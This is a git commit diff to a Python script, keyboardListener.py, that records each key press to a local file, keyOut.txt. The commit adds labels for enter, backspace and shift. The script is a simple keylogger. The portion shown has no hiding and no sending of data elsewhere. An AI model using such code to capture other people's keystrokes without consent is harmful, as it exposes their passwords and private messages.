4e20d397f76e91f43d815790afc80b4480e990f5
murmuringGunzy <gunzy.j@outlook.com>
2022-08-06 15:17:42 +1000

    stable

--- keyboardListener.py
+++ keyboardListener.py
@@ -9,10 +9,16 @@ def on_press(key):
                 with open('keyOut.txt','a') as f:
                         if key == key.space:
                                 f.write(' ')
+                        elif key == key.enter:
+                                f.write('[enter]')
+                        elif key == key.backspace:
+                                f.write('[backspace]')
+                        elif key == key.shift:
+                                f.write('[shift]')
                         else:
                                 f.write('?')
 def on_release(key):
         pass
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-                listener.join()
+        listener.join()
